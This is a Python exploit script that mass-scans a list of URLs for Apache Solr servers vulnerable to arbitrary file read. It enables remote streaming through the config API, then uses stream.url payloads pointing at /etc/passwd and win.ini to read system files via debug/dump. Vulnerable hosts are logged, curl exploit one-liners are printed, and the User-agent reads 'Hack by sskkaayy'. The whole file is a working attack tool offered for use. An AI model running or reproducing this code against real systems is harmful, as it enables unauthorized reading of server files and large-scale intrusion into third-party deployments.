import requests
import sys,re,json
import threadpool
#from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings()

aHeader = {
'User-agent' : 'Hack by sskkaayy',
'Content-type': 'application/json'
}

aPost = '{ "set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}'

bHeader = {
'Content-Type': 'multipart/form-data; boundary=------------------------f59326924c489d57'
}

bPost = '''
--------------------------f59326924c489d57
Content-Disposition: form-data; name="stream.url"

file:////etc/passwd
--------------------------f59326924c489d57--'''

cPost = '''
--------------------------f59326924c489d57
Content-Disposition: form-data; name="stream.url"

file:///C:windows/win.ini
--------------------------f59326924c489d57--'''

def exp(url):

    with open('ScanResult.txt',"a") as f:

        try:
            dbName = getDb(url)

            aUrl = '{}/solr/{}/config'.format(url,dbName)
            bUrl = '{}/solr/{}/debug/dump?param=ContentStreams'.format(url,dbName)

            x = requests.post(aUrl,headers=aHeader,data=aPost,verify=False,timeout=20)

            if '关于全网部署360私有云的通知' in x.text:
                return False

            if x.status_code==200:

                x = requests.post(bUrl,headers=bHeader,data=bPost,verify=False,timeout=20)
                if 'root:x:0:0:' in x.text:
                    exp = 'curl "{}/solr/{}/debug/dump?param=ContentStreams" -F "stream.url=file:////etc/passwd" '.format(url,dbName)
                    print("[+ !vul -- {} --".format(exp))
                    f.write(url+"\n")
                    return True
                x = requests.post(bUrl,headers=bHeader,data=cPost,verify=False,timeout=20)
                if 'extensions' in x.text:
                    exp = 'curl "{}/solr/{}/debug/dump?param=ContentStreams" -F "stream.url=file:///C:windows/win.ini" '.format(url,dbName)
                    print("[+ !vul -- {} --".format(exp))
                    f.write(url+"\n")
                    return True

        except Exception as httperror:
            print("Not vul")
            
def getDb(url):

    try:
        url = url + '/solr/admin/cores?action=STATUS'
        response = requests.get(url,verify=False,timeout=20)
        data = response.text
        try:
            r = re.compile('''"status":{
    "(.*?)":{''')
            Str = re.findall(r,str(data))
            dbName = Str[0]
        except:
            r = re.compile('''<str name="name">(.*?)</str><str name="instanceDir">''')
            Str = re.findall(r,str(data))
            dbName = Str[0]
    except Exception as e:
        pass

    return dbName


def multithreading(funcname, params=[], filename="ip.txt", pools=5):
    works = []
    with open(filename, "r") as f:
        for i in f:
            func_params = [i.rstrip("\n")] + params

            works.append((func_params, None))
    pool = threadpool.ThreadPool(pools)
    reqs = threadpool.makeRequests(funcname, works)

    [pool.putRequest(req) for req in reqs]
    pool.wait()

def main():
    multithreading(exp, [], "url.txt", 20)  # 默认15线程
    print("全部check完毕，请查看当前目录下的ScanResult.txt")

            
if __name__ == "__main__":
    main()
